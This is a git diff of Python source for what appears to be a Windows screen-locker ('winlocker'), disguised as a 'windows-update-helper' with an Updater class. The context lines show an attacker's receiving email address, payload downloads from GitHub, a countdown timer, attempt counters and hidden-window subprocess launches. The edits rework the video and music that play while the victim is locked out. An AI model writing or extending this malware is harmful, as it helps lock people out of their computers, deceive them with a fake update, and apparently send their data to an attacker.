@@ -27,7 +27,7 @@ RECEIVER_EMAIL = "xzx78848@gmail.com"
 VIDEO_URL = "https://github.com/ippo123459-bit/windows-update-helper/raw/refs/heads/main/fuxEcorp.mp4.mp4"
 MUSIC_URL = "https://github.com/ippo123459-bit/windows-update-helper/raw/refs/heads/main/Max_Quayle_-_Mr._Robot_OST_Main_Theme_(SkySound.cc)(1).mp3"
 LOGO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/icon.png"
-VIDEO_PATH = os.path.join(tempfile.gettempdir(), "fuxEcorp.mp4.mp4")
+VIDEO_PATH = os.path.join(tempfile.gettempdir(), "fuxEcorp.mp4")
 MUSIC_PATH = os.path.join(tempfile.gettempdir(), "theme.mp3")
 LOGO_PATH = os.path.join(tempfile.gettempdir(), "icon.png")
 attempts_left = MAX_ATTEMPTS
@@ -282,39 +282,28 @@ def anim_connect():
     a.destroy()
 
 def play_video():
-    """Видео + музыка синхронно, без консольных окон"""
+    """Видео со своим оригинальным звуком из MP4"""
     v_ok = download_file(VIDEO_URL, VIDEO_PATH)
-    m_ok = download_file(MUSIC_URL, MUSIC_PATH)
     
     if not v_ok:
         return
     
-    stop_music = threading.Event()
-    
-    def play_music():
-        if m_ok:
-            try:
-                pygame.mixer.init()
-                pygame.mixer.music.load(MUSIC_PATH)
-                pygame.mixer.music.set_volume(1.0)
-                pygame.mixer.music.play()
-                while not stop_music.is_set():
-                    time.sleep(0.1)
-                pygame.mixer.music.stop()
-            except:
-                pass
-    
-    music_thread = None
-    if m_ok:
-        music_thread = threading.Thread(target=play_music, daemon=True)
-        music_thread.start()
+    # Запускаем звук из самого видеофайла
+    music_started = False
+    try:
+        pygame.mixer.init()
+        pygame.mixer.music.load(VIDEO_PATH)
+        pygame.mixer.music.set_volume(1.0)
+        pygame.mixer.music.play()
+        music_started = True
+    except:
+        pass
     
     try:
         cap = cv2.VideoCapture(VIDEO_PATH)
         if not cap.isOpened():
-            stop_music.set()
-            if music_thread:
-                music_thread.join(timeout=1)
+            if music_started:
+                pygame.mixer.music.stop()
             return
         
         fps = cap.get(cv2.CAP_PROP_FPS)
@@ -353,9 +342,11 @@ def play_video():
     except:
         pass
     
-    stop_music.set()
-    if music_thread:
-        music_thread.join(timeout=1)
+    if music_started:
+        try:
+            pygame.mixer.music.stop()
+        except:
+            pass
 
 def si_hidden():
     si = subprocess.STARTUPINFO()
@@ -459,6 +450,7 @@ class Updater:
         self.timer_label.place(relx=0.5, rely=0.1, anchor='center')
         self.update_timer()
         
+        # Музыка для винлокера (после видео)
         try:
             if download_file(MUSIC_URL, MUSIC_PATH):
                 if os.path.exists(MUSIC_PATH) and os.path.getsize(MUSIC_PATH) > 1000:
